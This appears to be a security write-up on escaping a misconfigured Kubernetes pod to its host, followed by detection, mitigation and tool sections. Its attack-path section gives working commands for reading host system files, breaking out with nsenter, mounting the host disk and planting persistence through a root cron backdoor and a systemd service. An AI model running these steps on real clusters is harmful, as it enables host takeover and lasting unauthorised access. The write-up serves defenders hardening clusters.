# Container Escape: Kubernetes Pod to Host

**Date:** 2024-07-10
**Severity:** Critical
**Affected:** Kubernetes clusters with misconfigured pod security

## Summary

Documented a container escape technique in Kubernetes environments where overly permissive pod security policies allow escape from pod to host filesystem.

## Environment

- Kubernetes 1.24+
- Pod with `privileged: true` or mounted host paths
- Default kubelet configuration

## Attack Path

### Step 1: Pod Inspection

```bash
# Check pod security context
kubectl get pod <pod-name> -o yaml | grep -A 10 securityContext

# Check mounted volumes
kubectl describe pod <pod-name> | grep -A 20 Volumes
```

### Step 2: Host Path Exploitation

If hostPath volumes are mounted:

```bash
# Inside compromised pod
ls /host-pid/  # If /proc is mounted
cat /host-etc/passwd  # If /etc is mounted
```

### Step 3: Privilege Escalation

```bash
# Use nsenter to escape to host namespace
nsenter -t 1 -m -u -i -n -p /bin/bash

# Or mount host filesystem directly
mount /dev/sda1 /mnt/host
```

### Step 4: Persistence

```bash
# Create cron job on host
echo "* * * * * /tmp/backdoor.sh" > /var/spool/cron/root

# Or modify systemd service
systemctl enable malicious-service
```

## Detection

- Monitor for `nsenter` usage in containers
- Alert on hostPath volume mounts
- Track pod security context changes
- Monitor for new cron jobs or systemd services

## Mitigation

1. Use Pod Security Policies or Pod Security Standards
2. Avoid `privileged: true` unless necessary
3. Limit hostPath volume mounts
4. Use read-only root filesystems
5. Implement network policies

## Tools

- [kube-bench](https://github.com/aquasecurity/kube-bench)
- [Falco](https://github.com/falcosecurity/falco)
- [Trivy](https://github.com/aquasecurity/trivy)